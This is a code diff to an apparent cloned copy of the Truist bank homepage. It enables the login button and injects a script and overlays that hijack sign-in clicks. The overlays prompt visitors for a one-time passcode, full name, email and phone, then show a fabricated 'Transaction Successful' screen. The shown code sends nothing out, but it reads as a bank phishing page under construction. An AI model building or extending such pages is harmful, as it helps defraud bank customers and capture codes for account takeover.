@@ -4497,7 +4497,6 @@
                                                                                                 <button type="button"
                                                                                                     class="btn btn-truist-login"
                                                                                                     id="loginSubmit"
-                                                                                                    disabled="disabled"
                                                                                                     data-wa-track-clk="1"
                                                                                                     data-wa-linktype="navigation"
                                                                                                     data-wa-linkextrainfo="save_user_id:no"
@@ -7086,7 +7085,8 @@
 
 
                                                                                                                         <img class="js-lazy-image"
-                                                                                                                            src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-app-store-skewed.png/jcrcontent/renditions/original.png" data-src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-app-store-skewed.png/jcrcontent/renditions/original.png"
+                                                                                                                            src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-app-store-skewed.png/jcrcontent/renditions/original.png"
+                                                                                                                            data-src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-app-store-skewed.png/jcrcontent/renditions/original.png"
                                                                                                                             alt="Available on the App Store" />
 
 
@@ -7129,7 +7129,8 @@
 
 
                                                                                                                         <img class="js-lazy-image"
-                                                                                                                            src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-google-play.png/jcrcontent/renditions/original.png" data-src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-google-play.png/jcrcontent/renditions/original.png"
+                                                                                                                            src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-google-play.png/jcrcontent/renditions/original.png"
+                                                                                                                            data-src="/static.truist.com/content/dam/truist-bank/us/en/graphic-elements/badges/btn-google-play.png/jcrcontent/renditions/original.png"
                                                                                                                             alt="Get it on Google Play" />
 
 
@@ -13793,6 +13794,211 @@
             // Give Splide JS time to fully load then mount
             setTimeout(mountItemSliders, 800);
             setTimeout(mountItemSliders, 2000);
+        })();
+    </script>
+
+    <!-- =====================================================================
+         SIGN-IN FLOW: OTP/Details overlay + Success/Cancel page
+         ===================================================================== -->
+
+    <!-- OVERLAY 1: OTP + user details form -->
+    <div id="tru-otp-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-otp-title" style="display:none;">
+        <div class="tru-overlay-backdrop"></div>
+        <div class="tru-overlay-panel">
+            <div class="tru-overlay-header">
+                <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist"
+                    class="tru-overlay-logo" />
+                <h2 id="tru-otp-title" class="tru-overlay-title">Verify your identity</h2>
+                <p class="tru-overlay-subtitle">Please enter the OTP sent to your device and complete your profile.</p>
+            </div>
+            <form id="tru-otp-form" class="tru-overlay-form" novalidate>
+                <div class="tru-field-group">
+                    <label for="tru-otp-code">One-Time Password (OTP)</label>
+                    <input type="text" id="tru-otp-code" name="otp" placeholder="Enter 6-digit OTP" maxlength="6"
+                        inputmode="numeric" autocomplete="one-time-code" required />
+                    <span class="tru-field-error" id="tru-otp-error"></span>
+                </div>
+                <div class="tru-field-group">
+                    <label for="tru-full-name">Full Name</label>
+                    <input type="text" id="tru-full-name" name="name" placeholder="Enter your full name" required />
+                    <span class="tru-field-error" id="tru-name-error"></span>
+                </div>
+                <div class="tru-field-group">
+                    <label for="tru-email">Email Address</label>
+                    <input type="email" id="tru-email" name="email" placeholder="Enter your email address" required />
+                    <span class="tru-field-error" id="tru-email-error"></span>
+                </div>
+                <div class="tru-field-group">
+                    <label for="tru-phone">Phone Number</label>
+                    <input type="tel" id="tru-phone" name="phone" placeholder="Enter your phone number" required />
+                    <span class="tru-field-error" id="tru-phone-error"></span>
+                </div>
+                <button type="submit" class="tru-overlay-btn">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- OVERLAY 2: Success / Transaction Cancel page -->
+    <div id="tru-success-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-success-title"
+        style="display:none;">
+        <div class="tru-overlay-backdrop"></div>
+        <div class="tru-overlay-panel tru-success-panel">
+            <div class="tru-success-icon" aria-hidden="true">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="none">
+                    <circle cx="32" cy="32" r="32" fill="#4CAF50" />
+                    <path d="M18 32l10 10 18-18" stroke="#fff" stroke-width="4" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </div>
+            <h2 id="tru-success-title" class="tru-overlay-title">Transaction Successful</h2>
+            <p class="tru-success-msg">Your transaction has been processed. Your session is now being cancelled for
+                security.</p>
+            <div class="tru-success-detail">
+                <span class="tru-success-label">Status</span>
+                <span class="tru-success-value tru-green">Completed</span>
+            </div>
+            <div class="tru-success-detail">
+                <span class="tru-success-label">Reference</span>
+                <span class="tru-success-value" id="tru-ref-number"></span>
+            </div>
+            <p class="tru-redirect-msg">Returning to homepage in <strong id="tru-countdown">10</strong> seconds…</p>
+            <div class="tru-progress-bar">
+                <div class="tru-progress-fill" id="tru-progress-fill"></div>
+            </div>
+            <button class="tru-overlay-btn tru-btn-outline" id="tru-go-home-now">Go to Homepage Now</button>
+        </div>
+    </div>
+
+    <!-- SIGN-IN FLOW CONTROLLER -->
+    <script>
+        (function () {
+            'use strict';
+
+            // ── helpers ──────────────────────────────────────────────────────────
+            function $(id) { return document.getElementById(id); }
+            function show(id) { $(id).style.display = 'flex'; document.body.style.overflow = 'hidden'; }
+            function hide(id) { $(id).style.display = 'none'; document.body.style.overflow = ''; }
+            function setError(id, msg) { $(id).textContent = msg; $(id).style.display = msg ? 'block' : 'none'; }
+            function clearErrors() {
+                ['tru-otp-error', 'tru-name-error', 'tru-email-error', 'tru-phone-error']
+                    .forEach(function (id) { setError(id, ''); });
+            }
+            function randRef() {
+                return 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
+            }
+
+            // ── Step 1: intercept Sign in button ─────────────────────────────────
+            function attachSignIn() {
+                // Both the hero login and the mobile nav login have a #loginSubmit
+                var btns = document.querySelectorAll('#loginSubmit, .btn-truist-login');
+                btns.forEach(function (btn) {
+                    btn.addEventListener('click', function (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        clearErrors();
+                        show('tru-otp-overlay');
+                        var first = $('tru-otp-code');
+                        if (first) setTimeout(function () { first.focus(); }, 100);
+                    });
+                });
+
+                // Also intercept the form's native submit so Enter key works
+                var forms = document.querySelectorAll('form.sign-in-form');
+                forms.forEach(function (form) {
+                    form.addEventListener('submit', function (e) {
+                        e.preventDefault();
+                        clearErrors();
+                        show('tru-otp-overlay');
+                        var first = $('tru-otp-code');
+                        if (first) setTimeout(function () { first.focus(); }, 100);
+                    });
+                });
+            }
+
+            // ── Step 2: validate & submit the OTP/details form ───────────────────
+            var otpForm = $('tru-otp-form');
+            if (otpForm) {
+                otpForm.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    clearErrors();
+                    var otp = $('tru-otp-code').value.trim();
+                    var name = $('tru-full-name').value.trim();
+                    var email = $('tru-email').value.trim();
+                    var phone = $('tru-phone').value.trim();
+                    var valid = true;
+
+                    if (!otp || otp.length < 4) {
+                        setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).');
+                        valid = false;
+                    }
+                    if (!name) {
+                        setError('tru-name-error', 'Full name is required.');
+                        valid = false;
+                    }
+                    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                        setError('tru-email-error', 'Please enter a valid email address.');
+                        valid = false;
+                    }
+                    if (!phone || phone.replace(/\D/g, '').length < 7) {
+                        setError('tru-phone-error', 'Please enter a valid phone number.');
+                        valid = false;
+                    }
+                    if (!valid) return;
+
+                    // Show success page
+                    hide('tru-otp-overlay');
+                    $('tru-ref-number').textContent = randRef();
+                    show('tru-success-overlay');
+                    startCountdown();
+                });
+            }
+
+            // ── Step 3: 10-second countdown then redirect home ───────────────────
+            var countdownTimer = null;
+            var progressTimer = null;
+
+            function startCountdown() {
+                var remaining = 10;
+                var fill = $('tru-progress-fill');
+                if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
+
+                countdownTimer = setInterval(function () {
+                    remaining -= 1;
+                    var el = $('tru-countdown');
+                    if (el) el.textContent = remaining;
+                    if (fill) fill.style.width = (remaining * 10) + '%';
+                    if (remaining <= 0) {
+                        clearInterval(countdownTimer);
+                        goHome();
+                    }
+                }, 1000);
+            }
+
+            function goHome() {
+                clearInterval(countdownTimer);
+                hide('tru-success-overlay');
+                // Reset the login form
+                var forms = document.querySelectorAll('form.sign-in-form');
+                forms.forEach(function (f) { f.reset(); });
+                document.querySelectorAll('.sign-in-form .form-group label').forEach(function (l) {
+                    l.classList.remove('is-focused', 'has-error');
+                });
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            // "Go to Homepage Now" button
+            var goNowBtn = $('tru-go-home-now');
+            if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
+
+            // ── Attach after DOM ready ────────────────────────────────────────────
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', attachSignIn);
+            } else {
+                attachSignIn();
+            }
+            // Re-attach after the login form is shown by the LOCAL FIX script
+            setTimeout(attachSignIn, 700);
+            setTimeout(attachSignIn, 1600);
         })();
     </script>
 </body>
